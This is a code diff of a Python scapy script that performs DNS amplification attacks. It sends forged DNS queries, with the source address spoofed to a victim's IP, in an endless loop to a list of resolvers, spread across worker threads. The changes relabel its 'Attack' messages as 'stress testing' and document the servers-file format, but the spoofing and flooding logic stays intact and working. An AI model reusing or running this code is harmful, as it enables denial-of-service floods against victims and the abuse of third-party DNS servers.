@@ -5,7 +5,6 @@
 # Author: Georgii Starostin
 # E-mail: blackdiverx@gmail.com
 # Site: https://BlackDiver.net
-
 from scapy.all import *
 from multiprocessing import Pool as TPool
 import time
@@ -21,13 +20,14 @@ def dnsquery(dns):
 	ip=IP(src=target,dst=param[0])/UDP(dport=53)
 	dnsrequest=DNS(rd=1,qd=DNSQR(qname=param[1],qtype=param[2]))
 	p=ip/dnsrequest
-	print "Started Thread"
+	print "Start Thread (IP: ",param[0]," Query Type: ",param[2]," Query: ",param[1],")"
 	send(p,inter=0,loop=1,verbose=0)
 
 def main(dnsservers):
+	print "Starting DNS Amplification stress testing"
+	print "Timeout: ",timeout," sec"
 	pool=TPool(threads)
 	pool.map_async(dnsquery,dnsservers)
-	print "Started DNS Amplification Attack"
 	timer = time.time()+timeout
 	while True:
 		if timeout != 0 and time.time() > timer:
@@ -38,7 +38,7 @@ def main(dnsservers):
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-target", help="Target host")
-	parser.add_argument("-servers", default="servers.txt", help="DNS servers list(Default: servers.txt)")
+	parser.add_argument("-servers", default="servers.txt", help="DNS servers list(Default: servers.txt. File format: IP DNS_query Query_type)")
 	parser.add_argument("-timeout", type=int, default=10, help="Timeout querys. 0-Infinity (Default: 10sec)")
 	parser.add_argument("-threads", type=int, default=10, help="Query threads (Default: 10)")
 	args =  parser.parse_args()
@@ -54,4 +54,6 @@ if __name__ == '__main__':
 		threads = args.threads
 		main(readservers(DNSFile))
 	except KeyboardInterrupt:
-		print "Stop Attack and Exit"
+		print "Stoping stress testing and Exit"
+	print "Stress testing ended"
+
